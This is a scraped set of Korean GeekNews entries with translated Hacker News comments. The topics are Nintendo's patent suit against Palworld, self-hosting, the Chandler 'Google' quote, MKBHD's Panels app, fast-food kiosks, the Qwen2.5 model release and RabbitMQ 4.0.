     포켓페어는 도쿄에 본사를 둔 소규모 인디 게임 회사입니다. 저희 회사의 목표는 항상 재미있는 게임을 만드는 것이었습니다. 저희의 게임이 전 세계 수백만 명의 게이머에게 즐거움을 선사한다는 것을 알기에 앞으로도 이 목표를 계속 추구할 것입니다. 올해 팔월드는 게이머와 저희 모두에게 놀라운 성공을 거두었습니다. 저희는 게임에 대한 놀라운 반응에 놀랐고, 팬들을 위해 더 나은 게임을 만들기 위해 열심히 노력해왔습니다. 앞으로도 팔월드를 지속적으로 개선하여 팬들이 자랑스러워할 수 있는 게임을 만들기 위해 노력하겠습니다.
     이번 소송으로 인해 게임 개발과 무관한 사안에 상당한 시간을 할애해야 하는 것은 정말 안타까운 일입니다. 하지만 팬들을 위해, 그리고 인디 게임 개발자들이 창의적인 아이디어를 펼치는 데 방해받거나 낙담하지 않도록 최선을 다하겠습니다.
     이번 소식으로 인해 팬 여러분과 서포터 여러분께 걱정과 불편을 끼쳐드린 점 사과드립니다. 언제나 그렇듯이 앞으로도 팔월드와 포켓페어에 보내주시는 성원에 감사드립니다.

   뭔가 이상한 대응이군요. ""소규모 인디 게임 회사"", ""창의적인 아이디어를 펼치는 데 방해"" 라는 단어가 어울리지 않는 것 같은데요.

   최근에 포켓페어가 소니랑 손잡고 자기네 콘텐츠 라이센싱을 위한 조인트 벤처를 만들었다고 하니 더 이상 두고보면 안되겠다고 생각한듯

   특이하게 소니 뮤직 엔터네요?
   인디개발사에서 모든 특허검토를 할 수 없으니 인디는 그냥 두는게 상도인데 선을 넘었다고 생각했나보네요.

        Hacker News 의견

     * Pocketpair가 Nintendo와 동일한 변호사를 고용했음
     * 이는 특허 문제이며, 저작권 문제는 아님
     * Nintendo가 주장하는 특허가 게임 메커니즘과 관련된 것일 가능성이 높음
     * Palworld는 Pokemon 팬들이 Pokemon 게임에 실망하여 만든 게임임
          + 게임의 주요 목표는 'pals'를 모으는 것임
          + 'pals'를 이용해 기지를 구축하고, 더 나은 'pals'를 번식시키며, 무기를 제조함
          + Pokemon 게임과는 완전히 다른 게임임
     * Pocketpair가 몇 가지 자산을 재사용했다면, Nintendo에게 최대 5%를 지불해야 함
          + 그러나 이러한 자산이 게임의 성공에 큰 영향을 미치지 않았음
     * Nintendo는 Pokemon을 소유하지 않지만, 'The Pokemon Company'에 큰 지분을 가지고 있음
          + 이 구조가 IP 침해 소송을 더 어렵게 만들 수 있음
     * Palworld를 좋아하는 사람도 있으며, Nintendo의 법적 대응에 실망함
          + Nintendo가 에뮬레이터와 ROM 사이트를 공격하기 시작한 이후로 Nintendo 제품을 구매하지 않음
     * Pocketpair가 만든 Palworld는 Pokemon과 유사한 'pals'를 가지고 있음
     * 특허 소송은 매우 이상함
          + 대부분의 사람들이 저작권 소송을 예상했음
          + 소프트웨어 특허를 좋아하지 않으며, 경쟁사를 공격하기 위한 도구로 사용된다고 생각함
     * Nintendo가 이 문제를 해결하는 데 너무 오래 걸렸음
     * 침해된 특허 중 하나는 포획 메커니즘과 관련된 것일 가능성이 있음
     * Nintendo가 팬들을 소송하는 데 시간을 보냈기 때문에, 더 나은 변호사와의 대결에 준비되지 않았을 것임
"
"https://news.hada.io/topic?id=16836","셀프 호스팅을 위한 부드러운 가이드","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          셀프 호스팅을 위한 부드러운 가이드

    소프트웨어 자가 호스팅에 대한 부드러운 안내

     * 과거에는 소프트웨어와 게임이 DVD로 배포되었음. 2000년대에는 개인용 컴퓨터가 주류였고, Chromebook은 인터넷과 인터페이스만 있으면 대부분의 소프트웨어를 실행할 수 있는 새로운 개념이었음.
     * 2010년대에는 클라우드 컴퓨팅이 대세가 되었고, 구독 서비스가 광고 다음으로 온라인에서 돈을 버는 주요 방법이 되었음.
     * 이로 인해 컴퓨터 과학자들이 컴퓨터 애호가로 시작할 기회를 잃었고, 해커 정신이 점차 사라지고 있음.
     * 2024년에는 자가 호스팅의 기본적인 즐거움을 다시 탐구할 때가 되었음.

    왜 자가 호스팅을 해야 하는가?

     * 철학적 이유: 독점에 저항하고 디지털 자아에 대한 완전한 통제를 유지하는 방법으로, 온라인 자유의 마지막 보루임.
     * 실용적 이유: 비용을 절약할 수 있지만, 시간과 정신 건강을 잃을 수 있음. 다른 사람이 시스템의 신뢰성, 동시성, 중복성 및 가용성을 관리하게 하는 것이 더 실용적임.
     * 지적 이유: 시스템을 지속적으로 조정하는 디지털 차고로, 하루 일과 후에 좋아하는 장난감을 가지고 노는 것과 같음.
     * 가장 중요한 이유: 재미있어야 함. 취미로서의 자가 호스팅임.

    공유 호스팅

     * 공유 웹 호스팅 서비스는 여러 서비스가 하나의 웹 서버에 거주하는 방식임. 서버 유지 관리 비용이 여러 고객에게 분산됨.
     * Uberspace를 추천함. 매우 친절한 호스팅 서비스 제공자임.
     * Uberspace에 계정을 만들고 SSH 접근 권한을 얻어 클라우드에서 10GB의 저장 공간과 1.5GB의 RAM을 사용할 수 있음.

    소프트웨어 설치

     * Uberspace Labs: Uberspace에서 사용할 수 있는 다양한 소프트웨어 설치 가이드 제공.
     * Awesome-Selfhosted: 자가 호스팅 가능한 소프트웨어 목록 제공.
     * Docker는 Uberspace에서 사용할 수 없지만, 소스에서 소프트웨어를 설치하거나 Docker 이미지를 빌드 이미지로 사용할 수 있음.

    추천 소프트웨어

     * Actual Budget: 재정 관리 앱으로, Envelope Budgeting 방법론을 사용함. 민감한 재정 데이터를 제어하면서 전 세계 어디서나 브라우저를 통해 접근할 수 있음.
     * Miniflux: 최소주의적이고 의견이 강한 피드 리더. RSS 피드를 통해 여러 웹사이트의 업데이트를 한 곳에서 확인할 수 있음.

    보너스: 도메인

     * 자가 호스팅의 가장 멋진 부분은 개인 도메인을 통해 자신의 것을 자랑하는 것임.
     * 도메인 이름 등록 기관에서 도메인을 구입하고, Uberspace에서 호스팅하는 다양한 서비스를 서브도메인에 연결할 수 있음.
     * 이메일 제공자가 맞춤형 도메인 설정을 허용하는지 확인하고, 이메일 주소를 유지하면서 이메일 서비스 제공자를 변경할 수 있음.
     * 서브도메인이나 URL 경로를 GitHub 저장소에 연결하여 공개적으로 접근 가능한 파일을 호스팅할 수 있음.

    GN⁺의 정리

     * 이 글은 자가 호스팅의 기본적인 즐거움을 다시 탐구하고자 하는 사람들에게 유용함.
     * 자가 호스팅은 철학적, 실용적, 지적 이유로 가치가 있으며, 무엇보다도 재미있어야 함.
     * Uberspace와 같은 공유 호스팅 서비스를 통해 쉽게 시작할 수 있으며, 다양한 소프트웨어를 설치하고 사용할 수 있음.
     * 개인 도메인을 통해 자신의 것을 자랑하고, 이메일 주소를 유지하면서 서비스 제공자를 변경할 수 있음.
     * 자가 호스팅에 관심이 있는 사람들에게 흥미롭고 유용한 정보 제공.

        Hacker News 의견

     * 오래된 사용자로서, 공유 호스팅에 비용을 지불하는 것이 이제는 ""셀프 호스팅""이라고 불리는 것에 놀라움
          + 10년 전에는 셀프 호스팅이라고 부르지 않았음
          + 요리법이 진화한 것과 비슷함
     * 셀프 호스팅을 사랑하며 최근 몇 달 동안 많이 사용해 봄
          + 회사와 집에서 여러 서비스를 운영 중임
          + Hetzner VPS를 사용하고 ansible + docker compose 파일 또는 coolify를 통해 프로비저닝함
          + awesome-selfhosted 저장소는 좋은 프로젝트를 찾을 수 있지만 사용 편의성 면에서 부족함
          + 이를 개선하기 위해 selfhostedworld.com에서 UX 개선된 디렉토리를 만듦
     * ""다른 사람이 시스템의 신뢰성, 동시성, 중복성 및 가용성을 걱정하게 하라""는 의견에 반대함
          + 자동화된 전화 시스템을 통과하는 경험이 얼마나 힘든지 설명함
          + 문제 발생 시 직접 해결할 수 있는 것이 더 나음
          + 주요 호스팅 제공업체에 대해 인간과 대화할 수 있는지 여부에 대한 리뷰를 보고 싶어함
     * Kubernetes가 셀프 호스팅 커뮤니티에서 주목받고 있음
          + 3대의 Dell r720XD를 nixos와 k3s로 멀티 마스터 모드로 운영 중임
          + rook/ceph를 스토리지로 사용하며 다양한 크기의 하드 드라이브를 보유함
          + 하드 드라이브를 제거하고 다시 꽂아도 문제가 없음
     * 셀프 호스팅의 기쁨을 강조함
          + 학습, 도전, 유용성의 조합임
          + Actual Budget와 Changedetection.io를 추천함
          + 보안 위협 모델링을 언급하지 않은 점은 아쉬움
          + 초보자는 LAN 전용으로 호스팅하거나 보안을 강화해야 함
          + Docker를 사용하여 다양한 앱을 동시에 실행하는 것을 추천함
          + Docker 방법을 다룬 책을 홍보함
     * PikaPods의 아이디어를 좋아했지만 비용 문제로 실망함
          + 작은 인스턴스/서비스를 사용해도 비용이 많이 듦
          + 비용 효율적인 솔루션을 원함
     * 셀프 호스팅을 좋아하며 작은 취미 프로젝트에서 많은 것을 배움
          + 중고 Dell R630을 저렴하게 구입하여 사용 중임
          + 1tb raid 1 SSD, 32gb RAM, 32 코어, 1gbps 광섬유 연결을 사용함
          + IP 변경을 감지하기 위해 1분마다 cronjob을 사용하고 linode API로 DNS A 레코드를 변경함
     * Hetzner의 기본 클라우드 VPS가 더 나은 사양을 제공함
          + 4Gb RAM과 40Gb 디스크를 E4.51에 제공함
     * 이 가이드를 졸업한 후에는 /r/homelab과 /r/homedatacenter를 확인할 것을 추천함
"
"https://news.hada.io/topic?id=16825","구글이 말한 '네 초는 충분하지 않다' 인용 출처","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      구글이 말한 '네 초는 충분하지 않다' 인용 출처

    레이먼드 챈들러? 배리 N. 말즈버그? 블라드 사보브? 사실무근?

      알 수 없는 목적의 공상 과학 장치

     * 질문: 1950년대에 유명한 탐정 소설 작가가 공상 과학 소설을 패러디한 짧은 글을 썼다고 합니다. 이 글에는 ""Google""이라는 단어가 등장하는데, 이는 현재의 Google 회사가 존재하기 훨씬 전의 일입니다. 이 단어는 정보를 제공하는 존재를 의미했습니다. 이 주제에 대해 조사해 주시겠습니까?
     * 답변: 레이먼드 챈들러는 하드보일드 탐정 캐릭터 필립 말로의 창작자로 잘 알려져 있습니다. 1953년 챈들러는 친구에게 보낸 편지에서 공상 과학 소설을 패러디한 문장을 포함시켰습니다. 이 문장에는 ""Google""이라는 단어가 등장합니다.

      챈들러의 편지 내용

     * 내용: 챈들러는 ""Google""을 남성 인물로 묘사했습니다. 이는 남성 인간, 남성 외계인, 또는 의인화된 컴퓨팅 장치일 수 있습니다. 챈들러는 젊었을 때 크리켓을 했으며, ""google""이라는 용어는 크리켓에서 사용되는 용어일 수도 있습니다. 또는 만화 캐릭터 바니 구글이나 큰 숫자를 의미하는 ""googol""에서 영향을 받았을 수도 있습니다.

      추가 인용문

     * 1990년: 배리 N. 말즈버그는 챈들러의 편지를 재인용하여 공상 과학 소설을 작성했습니다.
     * 1997년: 서게이 브린과 래리 페이지는 검색 엔진 Backrub을 Google로 이름을 변경했습니다. 이 이름은 ""googol""에서 유래했으며, 페이지가 철자를 잘못 쓴 것이 계기가 되었습니다.
     * 2006년: 닉 홀트가 편집한 ""The Wit & Wisdom of Great Writers""에 챈들러의 공상 과학 소설 패러디 일부가 재인용되었습니다.
     * 2015년: 블라드 사보브는 ""The Verge"" 웹사이트에 ""Google was a 1953 Raymond Chandler joke""라는 제목의 기사를 게시했습니다.

    GN⁺의 정리

     * 이 기사는 레이먼드 챈들러가 1953년에 쓴 편지에서 ""Google""이라는 단어가 등장한 사실을 다룹니다.
     * 챈들러는 공상 과학 소설을 패러디하며 ""Google""을 정보 제공자로 묘사했습니다.
     * ""Google""이라는 이름은 1997년에 서게이 브린과 래리 페이지가 검색 엔진 이름으로 채택했습니다.
     * 이 기사는 공상 과학 소설과 실제 기술 발전 사이의 흥미로운 연결점을 보여줍니다.

        Hacker News 의견

     * Chandler의 패러디는 Golden 또는 Silver Age SF의 특징을 잘 반영함
          + TV Tropes의 ""Call A Rabbit a 'Smerp'""와 유사함
          + 일상적인 행동도 모험처럼 묘사됨
          + ""My breath froze into pink pretzels."" 같은 표현은 과도한 문체로 평가됨
     * Chandler의 인용문은 자주 사용되었음
          + Barney Google 만화는 Chandler가 ""Google""을 언급할 때 주요한 문화적 참조였음
          + ""Google""은 단순한 성으로 사용되었음
     * Chandler가 젊었을 때 크리켓을 했고, ""googly""라는 용어에서 영향을 받았을 가능성이 있음
     * 1931년 출판된 책 ""The Google Book""도 언급할 가치가 있음
          + 1979년 판본의 삽화가 훌륭함
     * Chandler의 SF 글은 그의 탐정 소설과 유사한 스타일을 가짐
          + 간결하고 긴장감 넘치는 문체
          + ""Google""은 기계나 전지전능한 존재가 아닌 단순한 인물로 보임
     * 시간 여행자를 찾기 위해 Google 검색이나 트윗을 조사한 사람들을 떠올리게 함
     * Wernher von Braun의 SF 소설에서 화성의 지도자가 ""elon""으로 불림
     * Asimov의 ""End of Eternity""와 유사한 시간 여행 이야기를 떠올리게 함
     * Chandler의 글은 비장르 작가가 장르를 모방한 것처럼 읽힘
          + Heinlein, Asimov, Doc Smith 같은 작가는 신조어 사용에 더 신중했음
     * 1921년의 잡지에서 ""Mr. Google""이 언급됨
     * Google이 처음 등장했을 때, 종종 googol.com을 잘못 입력했음
          + 이후 Google이 googol.com을 구매하여 리디렉션함
"
"https://news.hada.io/topic?id=16938","MKBHD의 새 월페이퍼 앱 'Panels' 공개와 비판적 반응","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  MKBHD의 새 월페이퍼 앱 'Panels' 공개와 비판적 반응

     * 유명 유튜버 MKBHD(Marques Brownlee)가 iPhone 16 리뷰 영상에서 새로운 월페이퍼 앱 'Panels'를 공개함
     * 하지만 아이폰 자체에 대한 댓글보다 앱에 대한 비판적인 의견만 쏟아짐
     * 비판의 주요 내용은 구독 가격과 과도한 데이터 수집에 대한 우려
          + Panels Plus 구독은 연간 $49.99 또는 월 $11.99로 높은 편
          + 무료로 이용 시에도 광고를 2번 봐야 하고 표준 해상도로만 다운로드 가능
     * iOS 버전에서는 앱이 사용자 활동 추적과 위치 데이터 사용 권한을 요구해 개인정보 문제도 제기됨
     * MKBHD는 X에 글을 올려 사용자 의견을 수렴하겠다고 밝힘
          + 프리미엄 버전의 가치를 높이기 위해 노력하고, 무료 버전의 광고 빈도를 줄이겠다고 언급
          + 데이터 수집 권한이 지나치게 광범위하다는 점을 인정하고, 실제로는 위치나 인터넷 기록 등을 요구하지 않을 것이라 해명
          + 관련 문제 해결을 위해 팀이 노력 중이라고 덧붙임
     * Panels는 처음부터 직접 만든 앱으로, 수익을 아티스트와 50대 50으로 나눌 계획
     * 현재는 월페이퍼 앱으로 시작하지만 지속적으로 개선해 나갈 것이라고 밝힘

   왜 이렇게 뻔한 실수를...

   MKBHD가 영향력이 꽤 큰데 왜 이런짓을 했냐며 역풍을 심하게 맞긴 하네요

   이 트윗이 딱 맞네요 https://x.com/_ali_taylor/status/1838655765730726172

     ""15년간 기술 제품 리뷰하다가 유료 배경화면앱을 출시했다는게 믿기지 않음. 전체 경력을 한방에 날려버리네요""

   존 그루버도 이에 대해서 정리했네요 https://daringfireball.net/2024/09/panels
     * 처음에 아이폰에서 실행하자 마자 앱이 죽음
     * UI가 크고 투박하며, iOS와 Android에서 거의 동일해 보이지만 어느 플랫폼에서도 네이티브하게 보이지 않음
          + 앱보다는 게임 인터페이스처럼 보임
     * 주관적이지만, 월페이퍼 자체가 좋지 않음. 하나도 맘에 드는게 없고, 프로페셔널 콘텐츠 보다는 그냥 UGC 같아보임
     * 앱의 개인 정보 보호 관련 부분이 형편없음
     * 일부 제작자의 ""SD""(1080p) 월페이퍼는 무료로 다운로드할 수 있지만 1~2분 분량의 광고 영상을 시청해야 함. 프리미엄스럽지 않음
     * 구독 비용이 연간 $50 또는 월 $12(연간 $144!)로 프리미엄 가격임
          + Wallaroo 같은게 훨씬 더 나은 앱이며 주관적으로 훨씬 더 나은 월페이퍼를 제공하지만 연간 $20 또는 월 $2에 불과함
     * 프리미엄 배경화면 앱이 연간 50달러의 가격을 책정하는 것은 전적으로 가능하지만 Panels는 프리미엄 앱이 아님
"
"https://news.hada.io/topic?id=16922","맥도날드 터치스크린 키오스크, 일자리를 위협한다는 우려를 받았으나 예상과는 다른 일이 일어남","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          맥도날드 터치스크린 키오스크, 일자리를 위협한다는 우려를 받았으나 예상과는 다른 일이 일어남

     * 맥도날드 등 패스트푸드 체인의 셀프 서비스 키오스크는 25년 전 처음 도입되었을 때 일자리를 없앨 것으로 우려되었음
     * 하지만 실제로는 예상과 다른 일이 일어났음
     * 키오스크는 주방 직원의 업무를 증가시키고, 고객들이 계산대에서보다 더 많은 음식을 주문하도록 만들었음
          + 패스트푸드와 소매업에서 기술이 의도치 않은 결과를 가져온 사례임
     * 체인들은 현재 드라이브스루에서 인공지능을 실험하고 있으며, 키오스크 경험이 이에 대한 교훈을 제공함

키오스크의 실제 활용

     * 오늘날 기업들은 키오스크를 직원 대체가 아닌 다른 업무로 전환하고, 매출 증대와 가격 조정, 서비스 속도 향상을 위해 사용함
     * Shake Shack CEO는 키오스크가 밀크쉐이크나 감자튀김 같은 ""추가 판매 기회를 보장한다""고 말함
     * 맥도날드 가맹점주들은 현금을 받고 거스름돈을 주는 키오스크를 도입하고 있지만, 계산원을 키오스크 사용을 돕는 ""게스트 경험 리더"" 등 다른 역할로 재배치하고 있음

키오스크의 한계

     * 이론적으로 키오스크는 인건비를 절약해야 하지만, 실제로는 모바일 주문과 배달로 인해 복잡성이 증가했고, 키오스크로 절약된 인력은 이러한 노력에 재할당되는 경우가 많음
     * 키오스크는 ""레스토랑 안의 레스토랑""을 만들어냈음
     * Bowlero와 같은 일부 체인에서는 키오스크가 실패하기도 함

키오스크의 예상치 못한 결과

     * 체인이 홍보하는 키오스크의 장점인 고객 추가 판매 유도와 주문 속도 향상이 항상 실현되는 것은 아님
     * Temple University 연구에 따르면, 키오스크 사용 중 줄이 길어지면 고객은 더 많은 스트레스를 받고 음식을 덜 구매함
     * 일부 고객은 키오스크로 주문하고 결제하는 데 계산원에게 주문하는 것보다 더 많은 시간이 소요됨
     * 키오스크가 오작동하거나 고장 날 수도 있음

키오스크와 최저임금 인상

     * 키오스크는 최저임금 인상에 대한 패스트푸드 업계의 대응책으로 여겨지기도 함
     * 전 맥도날드 CEO는 2016년 키오스크 확대 후 ""내가 말했듯이"" 노조의 최저임금 인상 요구가 기업으로 하여금 셀프 서비스 대안에 투자하도록 만들 것이라고 주장함
     * 캘리포니아는 올해 패스트푸드 근로자 최저임금을 시간당 $4 인상한 $20로 올렸고, 이에 따라 근로자들이 키오스크 등 기술로 대체될 것이라는 주장이 다시 제기됨

레스토랑 산업의 성장

     * 그러나 퀵서비스와 패스트 캐주얼 레스토랑 산업은 계속 성장하고 있음
     * 노동부 최신 자료에 따르면 직원 수는 팬데믹 이전 수준보다 약 15만 명, 즉 3% 증가함

셀프 서비스 기술의 영향

     * Drew University의 사회학자 Christopher Andrews는 키오스크의 영향이 ATM이나 슈퍼마켓 셀프 계산대와 같은 다른 셀프 서비스 기술과 유사하다고 말함
     * 두 기술 모두 일자리 감소를 초래할 것으로 예측되었음
     * 그러나 ATM 도입이 은행 창구 직원의 대량 실업으로 이어지지는 않았고, 오히려 저부가가치 업무에서 벗어나 다른 가치 창출 업무를 수행할 수 있게 해줌
     * 셀프 계산대 또한 소매 일자리 감소를 초래하지 않았음. 오히려 셀프 계산대는 고객 실수나 고의적 만행으로 인한 상품 손실을 증가시켜 일부 체인에게 역효과를 낳기도 함

셀프 서비스 기술에 대한 소통 필요성

     * Andrews는 패스트푸드 체인과 소매업체가 키오스크와 셀프 계산대의 잠재적 이점을 소비자와 직원에게 더 잘 전달해야 한다고 말함
     * 고객 입장에서는 이 기술이 어떻게 더 나은 서비스를 제공하는지 알아야 하며, 그렇지 않으면 단순히 노동 비용 절감을 위한 자동화 시도로 여길 것임

GN⁺의 의견

     * 키오스크와 같은 셀프 서비스 기술은 단순히 인력 대체가 아닌, 고객 경험 개선과 직원 업무 효율화라는 관점에서 바라볼 필요가 있음
     * 기술 도입 시 고객과 직원 모두에게 어떤 이점이 있는지 명확히 소통하고, 사용법을 충분히 교육하는 것이 중요함
     * 다만 ATM이나 셀프 계산대의 사례에서 보듯, 기술 도입이 반드시 일자리 감소로 이어지지는 않음. 오히려 직원들이 단순 반복 업무에서 벗어나 고객 서비스 등 부가가치 업무에 집중할 수 있게 해줌
     * 기술 발전으로 일자리가 사라지기보다는 업무 내용이 변화하고 새로운 역할이 생겨날 가능성이 높음. 따라서 직원 교육과 역량 개발에 지속적으로 투자해야 함
     * 한편 기술 도입 과정에서 발생할 수 있는 문제점을 면밀히 분석하고 보완책을 마련해야 함. 셀프 서비스 기술이 언제나 기대한 효과를 내는 것은 아니므로, 실제 운영 과정에서 나타나는 한계를 개선해 나가는 노력이 필요함

   단순 반복 업무를 줄여서 새로운 부가가치를 창출한다고 어떻게 고객을 설득할지 모르겠네요. 대부분의 고객이 키오스크를 불편해 하는 것 같던데

   대부분의 키오스크 모두 최악

   맥도날드의 키오스크는 UX 개선이 아닌 악화.. 아닐까요. 속 터지는 반응 속도 ㅠ

   한국 한정인 것 같은데 결제수단을 한 번 고르면 카드 리더에 카드 읽히는 시나리오만 고려되어 있고 결제수단 변경도 안 됩니다. 아웃소싱해서 한국 결제수단만 따로 붙인것 같은데 최악이에요

   지들도 안 써보고 출시하는게 분명 합니다.
   아니면 CIA의 지령을 받았거나....
"
"https://news.hada.io/topic?id=16852","Qwen2.5 - 여러 파운데이션 모델 공개","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        Qwen2.5 - 여러 파운데이션 모델 공개

     * Qwen2.5에는 LLM Qwen2.5, 코딩용 Qwen2.5-Coder, 수학용 Qwen2.5-Math 등 특화 모델이 포함됨
     * 모든 오픈 웨이트 모델은 dense decoder-only 언어 모델이며 0.5B에서 72B까지 다양한 크기로 제공됨
     * 3B와 72B 모델을 제외한 모든 오픈소스 모델은 Apache 2.0 라이선스로 제공됨
     * 플래그십 언어 모델인 Qwen-Plus와 Qwen-Turbo는 Model Studio를 통해 API로 제공됨
     * Qwen2-VL-72B도 오픈소스로 공개했으며 지난달 버전보다 성능이 향상되었음

Qwen2.5의 특징

     * 최대 18조 토큰의 대규모 데이터셋으로 사전학습되어 Qwen2에 비해 지식이 크게 늘어났음 (MMLU: 85+)
     * 코딩(HumanEval 85+)과 수학(MATH 80+) 능력도 크게 향상됨
     * 명령어 따르기, 긴 텍스트 생성(8K 토큰 이상), 구조화된 데이터 이해(예: 테이블), JSON 등 구조화된 출력 생성 능력이 크게 개선됨
     * 시스템 프롬프트 다양성에 더 강건해져 챗봇의 역할 수행과 조건 설정이 용이해짐
     * Qwen2와 마찬가지로 Qwen2.5 언어 모델은 최대 128K 토큰을 지원하고 최대 8K 토큰을 생성할 수 있음
     * 중국어, 영어, 프랑스어, 스페인어, 포르투갈어, 독일어, 이탈리아어, 러시아어, 일본어, 한국어, 베트남어, 태국어, 아랍어 등 29개 이상의 언어를 지원함

성능

  Qwen2.5

     * 최대 오픈소스 모델인 Qwen2.5-72B(72B 파라미터 dense decoder-only 언어 모델)의 성능을 Llama-3.1-70B, Mistral-Large-V2 등 주요 오픈소스 모델과 비교함
     * 다양한 벤치마크에서 명령어 튜닝 버전들의 포괄적인 결과를 제시하며 모델 능력과 사람의 선호도를 모두 평가함
     * 명령어 튜닝된 언어 모델 외에도 Qwen2.5-72B의 base 언어 모델이 Llama-3-405B 같은 더 큰 모델과 비교해도 최고 수준의 성능을 보임
     * API 기반 모델인 Qwen-Plus의 최신 버전을 GPT4-o, Claude-3.5-Sonnet, Llama-3.1-405B, DeepSeek-V2.5 등 유명 독점 및 오픈소스 모델과 비교함
          + Qwen-Plus가 DeepSeek-V2.5를 크게 능가하고 Llama-3.1-405B와 대등한 성능을 보이지만 일부 측면에서는 GPT4-o와 Claude-3.5-Sonnet에 미치지 못함
     * Qwen2.5-14B와 Qwen2.5-32B를 재도입함. 이 모델들은 Phi-3.5-MoE-Instruct, Gemma2-27B-IT 같은 비슷하거나 더 큰 크기의 기준 모델들을 능가함
     * API 기반 모델 Qwen-Turbo는 합리적인 가격으로 빠른 서비스를 제공하며 두 오픈소스 모델에 비해 매우 경쟁력 있는 성능을 보임
     * Qwen2.5-3B는 약 30억 개의 파라미터로 매우 인상적인 성능을 내며 이전 버전에 비해 효율성과 능력이 뛰어남
     * 벤치마크 평가 개선 외에도 사후 훈련 방법론을 개선했음. 4가지 주요 업데이트는 최대 8K 토큰까지 긴 텍스트 생성 지원, 구조화된 데이터 이해력 크게 향상, JSON 형식 등 구조화된 출력 생성이 더 신뢰할 수 있게 됨, 다양한 시스템 프롬프트에서 성능이 향상되어 역할 수행에 도움이 됨

  Qwen2.5-Coder

     * CodeQwen1.5 출시 이후 디버깅, 코딩 관련 질문 답변, 코드 제안 등 다양한 코딩 작업에 이 모델을 의존하는 사용자가 많아짐
     * 최신 버전 Qwen2.5-Coder는 코딩 응용 프로그램을 위해 특별히 설계됨
     * 크기가 작음에도 불구하고 다양한 프로그래밍 언어와 작업에서 더 큰 언어 모델들을 능가하는 등 뛰어난 코딩 능력을 보여줌

  Qwen2.5-Math

     * 지난달 처음 수학 전용 언어 모델인 Qwen2-Math를 출시했고, Qwen2-Math에 비해 Qwen2.5-Math는 Qwen2-Math가 생성한 합성 데이터를 포함해 더 대규모의 수학 관련 데이터로 사전학습되었음
     * 이번에는 중국어 지원을 확장했고 CoT, PoT, TIR 수행 능력을 부여하여 추론 능력도 강화
     * Qwen2.5-Math-72B-Instruct의 일반적인 성능은 Qwen2-Math-72B-Instruct와 GPT4-o를 능가하며, Qwen2.5-Math-1.5B-Instruct와 같은 매우 작은 전문가 모델조차도 대형 언어 모델과 비교해 매우 경쟁력 있는 성능을 낼 수 있음

Qwen2.5로 개발하기

     * Qwen2.5를 vLLM과 함께 사용하려면 다음 명령어로 OpenAI API 호환 서비스를 배포할 수 있음:
     * Qwen2.5는 vllm의 내장 tool calling을 지원함. 이 기능은 vllm>=0.6이 필요
     * Qwen2.5는 또한 Ollama의 tool calling을 지원
     * Hugging Face transformers의 tool calling 지원도 이용 가능
     * 이전에 Qwen-Agent가 Qwen2 자체 tool calling 템플릿을 사용해 tool calling을 지원했고, Qwen2.5는 Qwen2 템플릿 및 Qwen-Agent와도 호환성을 유지

앞으로 계획은?

     * 동시에 많은 고품질 모델을 출시하게 되어 기쁘지만 여전히 중대한 과제가 남아있음을 인지하고 있음
     * 최근 출시를 통해 언어, 시각-언어, 오디오-언어 영역에서 강력한 기반 모델을 개발하기 위해 노력하고 있음을 보여줌
     * 그러나 이러한 다양한 모달리티를 하나의 모델로 통합하여 모든 영역에서 정보를 원활하게 처리할 수 있도록 하는 것이 중요함
     * 데이터 스케일링을 통해 추론 능력을 향상시켰지만, 최근 강화학습 발전에 영감을 받아 inference compute를 스케일링하여 모델의 추론 능력을 더욱 향상시키는 데 전념하고 있음

   Alibaba, 오픈소스 AI 모델 QWEN 공개
   Alibaba, Qwen 2 모델 공개
"
"https://news.hada.io/topic?id=16834","RabbitMQ 4.0 출시","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            RabbitMQ 4.0 출시

     * Mnesia를 대체하기 위해 개발된 대체 스키마 데이터 저장소인 Khepri가 이제 완전히 지원됨
     * AMQP 1.0은 이제 항상 활성화되는 핵심 프로토콜임
          + AMQP 1.0 구현이 이제 훨씬 더 효율적. 일부 워크로드에서 최대 처리량이 3.13.x보다 2배 이상
     * 체크포인트를 사용한 노드 시작 시 효율적인 Sub-Linear Quorum Queue 복구
     * Quorum Queue는 이제 우선순위를 지원함(그러나 일반 큐와 정확히 같은 방식은 아님)
     * AMQP 1.0 클라이언트는 이제 AMQP 0-9-1 클라이언트가 하는 것과 유사한 방식으로 토폴로지를 관리할 수 있음
     * AMQP 0-9-1 엔티티와 상호 작용하기 위해 사용되는 AMQP 1.0 규칙(주소 형식)이 이제 이해하기 쉬움
     * 몇 년 동안 deprecation된 상태였던 클래식 큐의 미러링(복제)이 제거됨
          + 복제된 메시징 데이터 유형의 경우 쿼럼 큐 및/또는 스트림을 사용
          + Non-replicated 클래식 큐는 남아 있으며 개발은 계속됨
     * 클래식 큐 저장소 효율성이 개선됨 : 특히 복구 시간 및 멀티 MiB 메시지 저장 관련
     * 여러 개의 활성화된 플러그인과 디스크에서 복구할 데이터가 거의 없는 노드는 이제 20-30% 더 빨리 시작됨
     * 새로운 교환 유형: Local Random Exchange

Breaking Change

     * 클래식 큐는 이제 Non-Relicated Queue Type 임
     * Quorum Queue 는 이제 기본 Redelivery 제한이 생김(20)
     * CQv1 스토리지 구현이 제거됨
     * cluster_formation.randomized_startup_delay_range.* 설정이 제거됨
     * 최대 메시지 크기 디폴트값이 16MiB로 작아짐(기존 128MiB)

        Hacker News 의견

     * RabbitMQ는 오랫동안 숨겨진 비밀 무기처럼 여겨져 왔음
          + ""규모 확장"" 문제로 인해 대규모 사용자에게는 적합하지 않지만, 백만 명 이하의 사용자에게는 훌륭함
          + 많은 사람들이 grpc 같은 것을 사용하여 자체 pubsub을 만들지만, 초기 개발 단계에서는 RabbitMQ를 사용하는 것이 훨씬 나음
     * 이번 릴리스에는 새로운 AMQP 1.0 구현, 새로운 쿼럼 큐 기능, 새로운 스키마 데이터 저장소(Khepri)가 포함됨
     * 링크된 GitHub 페이지가 404 오류를 발생시키지만, 릴리스 노트는 다음에서 확인 가능함
          + 릴리스 노트 링크
     * RabbitMQ는 Broadcom에 인수된 VMware에 의해 개발됨
          + 인수 후에도 영향받지 않기를 바람
     * RabbitMQ는 네이티브 MQTT 브로커로도 작동할 수 있음
          + 엣지 애플리케이션/디바이스의 경우, 웹소켓을 통한 MQTT도 사용 가능함
